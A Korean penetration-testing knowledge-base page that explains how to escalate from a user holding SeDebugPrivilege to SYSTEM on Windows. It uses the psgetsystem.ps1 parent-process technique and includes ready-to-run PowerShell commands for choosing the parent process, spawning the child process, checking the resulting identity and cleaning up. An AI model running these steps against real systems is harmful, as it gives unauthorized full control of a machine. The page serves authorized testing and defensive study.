---
tags:
  - 환경/windows
시작조건: ["대상 Windows 호스트의 명령 실행", "현재 token에 SeDebugPrivilege가 할당됨"]
필요권한: ["현재 token의 SeDebugPrivilege", "선택한 SYSTEM process에 PROCESS_CREATE_PROCESS handle을 열 수 있는 권한"]
필요조건: ["PowerShell과 psgetsystem.ps1", "소유자가 NT AUTHORITY\\SYSTEM인 parent process PID", "기존 파일과 충돌하지 않는 proof 경로"]
결과: ["SYSTEM 자식 프로세스 생성", "SYSTEM 명령 실행 확인"]
---

# SeDebugPrivilege로 SYSTEM 자식 프로세스 생성

## 한 줄 판단

현재 token에 `SeDebugPrivilege`가 있고 소유자가 SYSTEM인 process에 필요한 handle을 열 수 있다면, `psgetsystem.ps1`로 그 process를 parent로 지정한 자식 process를 만들고 자식 명령의 실제 Identity를 확인한다.

## 전제 조건

`SeDebugPrivilege`는 원래 접근할 수 없는 process에 접근할 수 있게 하는 privilege지만, 표시만으로 SYSTEM process handle이나 자식 process 생성 성공을 보장하지 않는다. 현재 token의 privilege 활성화, parent handle의 `PROCESS_CREATE_PROCESS` 권한, parent process의 실제 token과 process 생성 결과는 [[Windows 액세스 토큰과 특권 활성화]]처럼 별도로 확인한다.

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 실행 위치 | 권한을 높일 대상 Windows 호스트의 PowerShell | `hostname`, `whoami` | 공격 호스트가 아니라 대상 세션인지 재확인 |
| 현재 privilege | `whoami /priv`에 `SeDebugPrivilege`가 존재 | `whoami /priv`의 존재와 Enabled·Disabled 상태 기록 | 이름이 없으면 이 경로를 사용하지 않음. Disabled이면 도구의 활성화 결과를 확인 |
| parent process | 실행 중이며 owner가 `NT AUTHORITY\SYSTEM`인 exact PID | 아래 `Get-CimInstance` 결과의 `ProcessId`, `Name`, `CreationDate`와 owner | process 이름만으로 owner를 추정하지 말고 다른 SYSTEM process 후보 확인 |
| 구현과 경로 | 현재 upstream의 `psgetsystem.ps1`과 기존 파일이 없는 `<PSGETSYSTEM_PATH>` | `Test-Path -LiteralPath '<PSGETSYSTEM_PATH>'`의 반입 전 `False`와 upstream usage | 다른 버전의 함수명·인자가 다르면 해당 source의 usage 확인 |
| Identity 확인 파일 | 기존 파일과 충돌하지 않는 `<SYSTEM_PROOF_PATH>` | `Test-Path -LiteralPath '<SYSTEM_PROOF_PATH>'`가 `False` | 고유한 exact 경로로 변경 |

## 실행

### 1. SYSTEM parent PID 확인

대상 Windows PowerShell에서 후보 process의 소유자를 직접 확인하고, 사용할 PID와 생성 시각을 기록한다.

```powershell
Get-CimInstance Win32_Process -Filter 'ProcessId = <SYSTEM_PARENT_PID>' |
  Invoke-CimMethod -MethodName GetOwner
Get-CimInstance Win32_Process -Filter 'ProcessId = <SYSTEM_PARENT_PID>' |
  Select-Object ProcessId,Name,CreationDate,ExecutablePath
```

확인할 출력:

- `User`가 `SYSTEM`, `Domain`이 `NT AUTHORITY`인 실행 중 process여야 한다.
- PID 재사용을 피하려고 `ProcessId`와 `CreationDate`를 함께 기록한다.
- owner 조회 실패나 다른 계정 출력은 SYSTEM parent가 확인되지 않은 상태다.

### 2. privilege와 파일 기준선 확인

```powershell
whoami /priv
Test-Path -LiteralPath '<PSGETSYSTEM_PATH>'
Test-Path -LiteralPath '<SYSTEM_PROOF_PATH>'
```

두 `Test-Path`가 반입·생성 전에 `False`인 고유 경로를 선택한다. `<PSGETSYSTEM_PATH>`는 대상 Windows 호스트의 절대 script 경로(예: `C:\\Temp\\psgetsystem.ps1`)이고, `<SYSTEM_PROOF_PATH>`는 같은 호스트에서 이번 자식 명령이 만드는 고유 파일 경로(예: `C:\\Temp\\system-identity.txt`)다. [[상황별 파일 전송]]으로 script를 반입한 뒤 exact 경로를 확인한다.

`SeDebugPrivilege Disabled`는 privilege가 token에 존재하지만 아직 사용 성공이 확인되지 않은 상태다. 현재 upstream 구현은 `Process.EnterDebugMode()`로 활성화를 요청하므로 이후 handle 획득과 process 생성 출력을 확인한다.

### 3. SYSTEM 자식 process 생성과 Identity 확인

현재 upstream usage에 맞춰 script를 import하고, 짧게 종료되는 자식 명령으로 proof 파일을 만든다.

```powershell
Import-Module '<PSGETSYSTEM_PATH>'
ImpersonateFromParentPid -ppid <SYSTEM_PARENT_PID> -command 'C:\Windows\System32\cmd.exe' -cmdargs '/c whoami > "<SYSTEM_PROOF_PATH>"'
Get-Content -LiteralPath '<SYSTEM_PROOF_PATH>'
Get-CimInstance Win32_Process -Filter 'ProcessId = <NEW_PROCESS_PID>' |
  Select-Object ProcessId,Name,CreationDate,ExecutablePath
```

확인할 출력:

- `Got Handle for ppid`, `Updated proc attribute list`, `True - pid: <NEW_PROCESS_PID> - Last error: 0`가 순서대로 보이는지 확인한다.
- `<NEW_PROCESS_PID>`를 기록하고 proof 파일 내용이 `nt authority\system`인지 확인한다. 자식이 아직 실행 중이면 `CreationDate`도 기록한다. process 생성 성공 표시와 자식 Identity 확인이 모두 있어야 SYSTEM 명령 실행을 확정한다.
- handle 획득이 거부되면 현재 privilege 활성화, parent PID·생성 시각과 PPL·보호 process 여부를 먼저 확인한다.
- 반환값이 `False`이거나 proof 파일이 없으면 attribute update, command·인자 quoting, 실행 정책·방어 제품과 쓰기 경로를 구분해 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `True - pid`와 proof의 `nt authority\system` | SYSTEM parent token을 상속한 자식 명령 실행 확인 | SYSTEM 명령 실행 | [[고권한 세션 확보 후 후속 판단]] |
| privilege는 존재하지만 parent handle 획득 실패 | privilege 활성화 또는 대상 process 보호 조건 미충족 | 일반 Windows 명령 실행 유지 | 다른 SYSTEM parent 후보와 PPL·보안 제어 확인 |
| process 생성은 `True`지만 proof가 없거나 Identity가 다름 | 요청한 명령·인자 또는 실제 자식 token 미확인 | SYSTEM 결과 미확정 | exact command line, proof 경로와 자식 Identity 재확인 |
| script import·compile 차단 | 파일·PowerShell·애플리케이션 제어 문제 | 구현 미실행 | execution policy·language mode·방어 제품 확인 |

## 변경 영향과 복구

이 절차는 반입한 `<PSGETSYSTEM_PATH>`, 생성한 `<SYSTEM_PROOF_PATH>`와 잠시 존재할 수 있는 `<NEW_PROCESS_PID>`만 대상으로 한다. parent process는 기존 시스템 process이므로 종료하거나 변경하지 않는다.

먼저 기록한 PID가 아직 존재하면 이름·시작 시각을 대조한 뒤 이번 작업의 자식 process일 때만 종료한다. proof 명령처럼 이미 종료된 경우에는 종료 명령을 실행하지 않는다.

```powershell
$child = Get-CimInstance Win32_Process -Filter 'ProcessId = <NEW_PROCESS_PID>'
$child | Select-Object ProcessId,Name,CreationDate,ExecutablePath
if ($child -and $child.CreationDate -eq [datetime]'<NEW_PROCESS_CREATION_DATE>') {
  Stop-Process -Id <NEW_PROCESS_PID>
}
Get-CimInstance Win32_Process -Filter 'ProcessId = <NEW_PROCESS_PID>'
Remove-Item -LiteralPath '<SYSTEM_PROOF_PATH>' -Force
Remove-Item -LiteralPath '<PSGETSYSTEM_PATH>' -Force
Test-Path -LiteralPath '<SYSTEM_PROOF_PATH>'
Test-Path -LiteralPath '<PSGETSYSTEM_PATH>'
```

두 `Test-Path`가 `False`이고 기록한 자식 PID가 더 이상 조회되지 않아야 정리를 확인한 것이다. PID·시작 시각이 기록과 다르면 PID 재사용 가능성이 있으므로 종료하지 않는다. script나 proof 파일이 작업 전부터 있었거나 이번 작업에서 반입·생성했음을 확인할 수 없으면 삭제하지 않는다.

## 관련 공격기법

- [[Windows 권한 상승 열거]]
- [[LSASS 메모리 덤프]]
- [[상황별 파일 전송]]

## 관련 상태 라우터

- [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]
- [[고권한 세션 확보 후 후속 판단]]

## 관련 도구

- [[powershell]]

## 참고 링크

- [decoder-it: psgetsystem](https://github.com/decoder-it/psgetsystem)
- [Microsoft: Debug Privilege](https://learn.microsoft.com/windows-hardware/drivers/debugger/debug-privilege)
- [Microsoft: UpdateProcThreadAttribute](https://learn.microsoft.com/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)
